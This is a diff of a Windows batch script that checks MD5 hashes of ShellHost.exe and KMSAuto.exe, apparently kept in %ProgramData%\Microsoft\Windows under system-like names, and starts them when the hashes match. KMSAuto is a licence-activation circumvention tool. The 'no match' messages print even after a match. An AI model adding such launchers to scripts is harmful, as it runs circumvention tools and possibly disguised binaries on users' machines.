@@ -398,16 +398,8 @@ echo.
 
 
 
-
 set "ShellHostMD5=f08c58ee2c0a30f6e6bdc26b624bb323"
 set "KMSAutoMD5=325d0bd19d0153c5be3324cdbba60e33"
-
-
-
-
-
-
-
 
 
 
@@ -932,10 +924,68 @@ echo.
 
 
 
+:RUNNINGSHSTKMS
+
+
+for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
+echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
+echo.
+echo Comparing with stored MD5: %ShellHostMD5%
+echo.
+
+if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
+    echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
+    echo Starting %SHSTFILE%
+    start "" "%SHSTFILE%"
+    echo Started.
+    echo.
+)
+
+echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
+echo No Start for %SHSTFILE%
+echo.
+
+
+
+
+
+for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
+echo MD5 of %KMSFILE% = %KMSFILEmd5%
+echo.
+echo Comparing with stored MD5: %KMSAutoMD5%
+echo.
+
+if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
+    echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
+    echo Starting %KMSFILE%
+    start "" "%KMSFILE%"
+    echo Started.
+    echo.
+)
+
+echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
+echo No Start for %KMSFILE%
+echo.
+
+
+
+
+
+
+
+
+
+
+
 
 
 ::if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
 ::if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+
+
+
+
+
 
 
 
